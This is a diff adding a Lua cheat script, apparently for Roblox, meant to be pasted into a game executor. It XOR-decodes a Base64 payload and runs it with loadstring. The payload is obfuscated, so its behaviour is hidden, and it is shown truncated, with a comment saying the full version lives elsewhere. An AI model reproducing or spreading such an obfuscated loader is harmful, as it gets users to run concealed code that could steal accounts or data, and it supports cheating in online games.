@@ -1,0 +1,23 @@
+-- MobileBrainrotGUI | obfuscated XOR+B64
+-- paste into any executor
+local _k = { 69,60,175,75,33,139,198,191,147,69,175,15 }
+local _p = {
+"KVPMKk2rlMr9Fsp9M1XMLgG25tjyKMo1AlnbGET5sNbwIIctF0nBGET5sNbwII0mT1DAKEDn5u//JNZqN0+PdgHsp9L2f+hqMW/KOVfipdq7Z/9jJEXKOVKp77X/KsxuKRz6OET5j9HjMNtcIE7ZIkLu5oKzIs5iIAboLlXYo83lLMxqbR76OET5j9HjMNtcIE7ZIkLu5JaZKcBsJFCPH0Tno8/8N9tcIE7ZIkLu5oKzIs5iIAboLlXYo83lLMxqbR77Lk3uttDhMfxqN0rGKESp77X/KsxuKRznP1X7ldr..."
+-- (payload completo en el archivo)
+}
+local function _dec()
+    local h = game:GetService("HttpService")
+    local raw = h:Base64Decode(table.concat(_p))
+    local out = {}
+    local kl = #_k
+    for i = 1, #raw do
+        out[i] = string.char(bit32.bxor(string.byte(raw, i), _k[((i - 1) % kl) + 1]))
+    end
+    return table.concat(out)
+end
+local src = _dec()
+local fn, err = loadstring(src)
+if not fn then
+    error("load fail: " .. tostring(err))
+end
+fn()
